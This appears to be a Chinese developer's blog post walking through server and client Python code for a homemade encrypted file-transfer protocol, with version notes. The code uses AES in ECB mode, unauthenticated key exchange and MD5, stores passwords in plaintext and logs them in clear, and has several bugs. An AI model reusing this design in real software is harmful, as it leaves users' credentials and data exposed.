class="line">        query_thread1.adduser(sock,username,password)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    addr = format(addr[0])</span><br><span class="line">    log_name = &quot;logfile/&quot;+addr+&quot;-log&quot;</span><br><span class="line">    try:</span><br><span class="line">        log_file = open(log_name,&#x27;ab+&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;连接成功&quot;</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;)</span><br><span class="line">    permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    while 1:</span><br><span class="line">        menu(sock)</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            break</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data,log_file,addr)</span><br><span class="line">        if data_type == 1:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            transfer_txt(addr,data,log_file)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file)</span><br><span class="line">            else:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file(sock,data,addr,log_file)</span><br><span class="line">        elif data_type ==3:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            register(permission_value,sock,data,query_thread1,log_file,addr,username)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">        4.断开连接</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        failure_msg = &quot;第&quot;</span><br><span class="line">        failure_number = None</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = (s.recv(1024)).decode()</span><br><span class="line">            if &quot;失败&quot; in text:</span><br><span class="line">                start_index = text.find(&#x27;&#123;&#x27;) + 1</span><br><span class="line">                end_index = text.find(&#x27;&#125;&#x27;)</span><br><span class="line">                failure_number = text[start_index:end_index]</span><br><span class="line">                failure_msg += failure_number+&quot;,&quot;</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">        failure_msg += &quot;组传输失败&quot;</span><br><span class="line">        if failure_number != None:</span><br><span class="line">            print(failure_msg)</span><br><span class="line">        print(&quot;\n&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        elif choice == &quot;4&quot;:</span><br><span class="line">            print(&quot;程序终止&quot;)</span><br><span class="line">            s.close()</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v0-9"><a href="#v0-9" class="headerlink" title="v0.9"></a>v0.9</h2><p>这个版本的目的是修修bug 尽量优化一下代码 准备在1.0版本实现图形化管理界面 然后就正式结束了这个项目<br>针对传输速率过慢的问题 大概有了头绪了 原因出在客户端输出当前组数据校验是否正确 这一功能是利用客户端和服务端高频send和recv的 所以会造成卡顿<br>取消掉了以后发送速度明显提高 但是接受速度跟不上了 这里想到的解决办法是专门给大文件收发开一个新线程 看看能不能实现 然后关于切片那一块可能也要优化一下了<br>11&#x2F;9记<br>mlgb 我觉得用socket作为这个协议的基础框架根本就是个错误的选择 服务端运行在服务器上的时候 会因为各种奇奇怪怪的原因导致丢包 最后只能通过sleep来控制客户端发包的速度<br>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line">def write_log(log_file,text):</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text += &quot;   &quot;+current_time</span><br><span class="line">    log_file.write(text.encode()+b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">class query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(sock,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data,log_file,addr):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == False:</span><br><span class="line">        fail_number = sliced_num</span><br><span class="line">    else:</span><br><span class="line">        fail_number = None</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,fail_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1,addr,log_file):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    if len(username) == 0:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return             </span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    username = username.decode()</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        if len(password) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            sock.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        password = decrypt_data(shared_key,password)</span><br><span class="line">        password = password.decode()</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            return permission_value,username</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3,username</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3,username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data,log_file):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;   &quot;+current_time</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data,addr,log_file):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;text/plain&quot;:</span><br><span class="line">            filename += &quot;.txt&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,first_data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据</span><br><span class="line">    data_bytes = first_data</span><br><span class="line">    orign_data = []</span><br><span class="line">    fail_number = []</span><br><span class="line">    </span><br><span class="line">    for i in range(sliced_sum-1):</span><br><span class="line">        text = sock.recv(1084)</span><br><span class="line">        orign_data.append(text)</span><br><span class="line">        if len(text) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)    </span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)       </span><br><span class="line">            sock.close()     </span><br><span class="line">            return</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行数据处理&quot;)</span><br><span class="line">    for i in range(sliced_sum-1):</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data[i],log_file,addr)</span><br><span class="line">        if fail != None:</span><br><span class="line">            fail_number.append(fail)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    </span><br><span class="line">    if len(fail_number)&gt;0:</span><br><span class="line">        fail_meg = &quot;,&quot;.join(fail_number)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;)</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;image/png&quot;:</span><br><span class="line">            filename += &quot;.png&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">            filename += &quot;.mp3&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1,log_file,addr,login_username):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot;</span><br><span class="line">        